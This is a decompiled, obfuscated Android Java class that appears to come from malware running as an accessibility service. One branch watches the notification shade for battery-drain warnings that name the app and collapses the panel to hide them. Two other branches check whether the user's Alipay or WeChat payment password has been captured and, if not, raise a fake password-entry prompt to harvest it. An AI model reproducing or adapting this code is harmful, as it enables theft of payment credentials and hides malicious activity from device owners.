package p000;

import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import java.util.Iterator;
import java.util.List;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.text.AbstractC0779a1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: i8 */
/* loaded from: classes2.dex */
public final class RunnableC0613i8 implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f56818a0;

    /* renamed from: a1 */
    public final /* synthetic */ C0614i9 f56819a1;

    public /* synthetic */ RunnableC0613i8(C0614i9 c0614i9, int i) {
        this.f56818a0 = i;
        this.f56819a1 = c0614i9;
    }

    @Override // java.lang.Runnable
    public final void run() {
        AccessibilityNodeInfo rootInActiveWindow;
        boolean z;
        switch (this.f56818a0) {
            case 0:
                C0614i9 c0614i9 = this.f56819a1;
                dqtvuisjd dqtvuisjdVar = c0614i9.f56820a0;
                c0614i9.f56846c6 = null;
                try {
                    if (System.currentTimeMillis() - c0614i9.f56845c5 >= 120000 && (rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow()) != null) {
                        String strM213126b4 = c0614i9.m213126b4();
                        if (strM213126b4.length() != 0) {
                            String strM213111a2 = C0614i9.m213111a2(rootInActiveWindow);
                            List listM213306g5 = AbstractC0716jf.m213306g5("高耗电", "高功耗", "耗电过快", "耗电异常", "后台耗电", "后台高耗电", "后台频繁刷新", "正在后台消耗电量", "电池消耗", "高电量使用", "battery drain", "high battery", "consuming battery");
                            if (listM213306g5 == null || !listM213306g5.isEmpty()) {
                                Iterator it = listM213306g5.iterator();
                                while (it.hasNext()) {
                                    z = true;
                                    if (AbstractC0779a1.m213652a5(strM213111a2, (String) it.next(), true)) {
                                    }
                                }
                                z = false;
                            } else {
                                z = false;
                            }
                            boolean zM213652a5 = AbstractC0779a1.m213652a5(strM213111a2, strM213126b4, false);
                            if (!z || !zM213652a5) {
                                cq0.m212492d5(rootInActiveWindow);
                                break;
                            } else {
                                t60.m214726f4("AccessibilityEventManager", "⚡ 通知栏检测到高耗电警告(包含本应用: " + strM213126b4 + ")");
                                c0614i9.f56845c5 = System.currentTimeMillis();
                                try {
                                    cq0.m212492d5(rootInActiveWindow);
                                } catch (Exception unused) {
                                }
                                dqtvuisjdVar.performGlobalAction(2);
                                t60.m214726f4("AccessibilityEventManager", "检测到高耗电通知，已收起通知面板");
                                break;
                            }
                        } else {
                            cq0.m212492d5(rootInActiveWindow);
                            break;
                        }
                    }
                } catch (Exception unused2) {
                    return;
                }
                break;
            case 1:
                C0614i9 c0614i92 = this.f56819a1;
                try {
                    if (c0614i92.m213131c0()) {
                        boolean z2 = false;
                        try {
                            z2 = C0107as.f45610a3.getInstance(c0614i92.f56821a1).f45619a1.getBoolean(C0107as.f45611a4, false);
                        } catch (Exception e) {
                            t60.m214705c6("AccessibilityEventManager", "❌ 检查支付宝密码状态失败", e);
                        }
                        if (!z2) {
                            t60.m214714d6("AccessibilityEventManager", "💰 自动检测：支付宝密码未记录，弹出密码输入框");
                            c0614i92.m213139c8();
                            dqtvuisjd dqtvuisjdVar2 = c0614i92.f56820a0;
                            AbstractC0770a1.m213614f9(new Pair("trigger", "auto_detection"), new Pair("delayMs", Long.valueOf(c0614i92.f56835b5)), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
                            dqtvuisjdVar2.getClass();
                            dqtvuisjd.m211435k0("AUTO_ALIPAY_PASSWORD_TRIGGERED", "自动触发支付宝密码输入");
                            break;
                        }
                    }
                } catch (Exception e2) {
                    t60.m214705c6("AccessibilityEventManager", "❌ 自动支付宝密码检测失败", e2);
                    return;
                }
                break;
            default:
                C0614i9 c0614i93 = this.f56819a1;
                try {
                    if (c0614i93.m213132c1()) {
                        boolean z3 = false;
                        try {
                            z3 = C0107as.f45610a3.getInstance(c0614i93.f56821a1).f45619a1.getBoolean(C0107as.f45612a5, false);
                        } catch (Exception e3) {
                            t60.m214705c6("AccessibilityEventManager", "❌ 检查微信密码状态失败", e3);
                        }
                        if (!z3) {
                            t60.m214714d6("AccessibilityEventManager", "💬 自动检测：微信密码未记录，弹出密码输入框");
                            c0614i93.m213138c7();
                            dqtvuisjd dqtvuisjdVar3 = c0614i93.f56820a0;
                            AbstractC0770a1.m213614f9(new Pair("trigger", "auto_detection"), new Pair("delayMs", Long.valueOf(c0614i93.f56835b5)), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
                            dqtvuisjdVar3.getClass();
                            dqtvuisjd.m211435k0("AUTO_WECHAT_PASSWORD_TRIGGERED", "自动触发微信密码输入");
                            break;
                        }
                    }
                } catch (Exception e4) {
                    t60.m214705c6("AccessibilityEventManager", "❌ 自动微信密码检测失败", e4);
                }
                break;
        }
    }
}
